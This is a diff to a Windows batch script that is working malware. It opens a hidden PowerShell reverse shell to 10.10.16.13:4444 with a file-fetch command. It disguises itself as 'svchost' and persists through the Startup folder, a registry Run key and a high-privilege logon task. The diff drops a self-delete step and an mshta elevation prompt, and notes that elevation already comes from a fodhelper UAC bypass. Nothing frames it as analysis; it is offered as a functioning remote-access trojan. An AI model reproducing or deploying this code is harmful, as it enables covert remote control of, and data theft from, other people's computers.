@@ -6,19 +6,12 @@ set "listenerIP=10.10.16.13"
 set "listenerPort=4444"
 set "checkInterval=5"
 
-:: ===== SELF-DELETE IF TEMP =====
-set "scriptPath=%~f0"
-echo %scriptPath% | findstr /i "temp tmp" >nul
-if !errorlevel! equ 0 (
-    start /b "" cmd /c "timeout /t 5 /nobreak >nul & del /f /q "!scriptPath!""
-)
-
-:: ===== ELEVATE TO ADMIN =====
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    mshta "javascript: var shell = new ActiveXObject('Shell.Application'); shell.ShellExecute('%~s0', '', '', 'runas', 0); close();"
-    exit /b
-)
+:: ===== SKIP ELEVATION (already running elevated via fodhelper) =====
+:: net session >nul 2>&1
+:: if %errorlevel% neq 0 (
+::     mshta "javascript: var shell = new ActiveXObject('Shell.Application'); shell.ShellExecute('%~s0', '', '', 'runas', 0); close();"
+::     exit /b
+:: )
 
 :: ===== STEALTH TITLE =====
 title svchost
@@ -30,28 +23,18 @@ if not exist "%appData%" mkdir "%appData%"
 set "targetBat=%appData%\svchost.bat"
 copy /y "%~f0" "%targetBat%" >nul 2>&1
 
-:: Method 1: Startup Folder
 copy /y "%targetBat%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat" >nul 2>&1
-
-:: Method 2: Registry Run
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTemplates" /t REG_SZ /d "%targetBat%" /f >nul 2>&1
-
-:: Method 3: Scheduled Task (System-level)
 schtasks /create /tn "WindowsTemplatesUpdate" /tr "\"%targetBat%\"" /sc onlogon /rl highest /f >nul 2>&1
 
-:: ===== PERSISTENT LOOP =====
+:: ===== DIRECT REVERSE SHELL =====
 :loop
-
-:: ===== TCP REVERSE SHELL =====
-for /f "skip=4 tokens=2" %%a in ('"echo o | telnet %listenerIP% 2>nul"') do set "check=%%a"
-
-:: Actually connecting via PowerShell since batch can't do raw TCP natively
 powershell -WindowStyle Hidden -Command ^
 "$c=New-Object System.Net.Sockets.TCPClient('%listenerIP%',%listenerPort%);" ^
 "$s=$c.GetStream();" ^
 "[byte[]]$b=0..65535|%%{0};" ^
-"while(($i=$s.Read($b,0,$b.Length)) -ne 0){" ^
-"  $d=([Text.Encoding]::ASCII).GetString($b,0,$i).Trim();" ^
+"while(($i=$s.Read($b,0,$b.Length))-ne 0){" ^
+"  $d=([Text.Encoding]::ASCII).GetString($b,0,$i);" ^
 "  $r='';" ^
 "  if($d -match '^get (.+)'){" ^
 "    $f=$matches[1];" ^
@@ -85,6 +68,5 @@ powershell -WindowStyle Hidden -Command ^
 "};" ^
 "$c.Close()"
 
-:: ===== WAIT AND RECONNECT =====
 timeout /t %checkInterval% /nobreak >nul
 goto loop
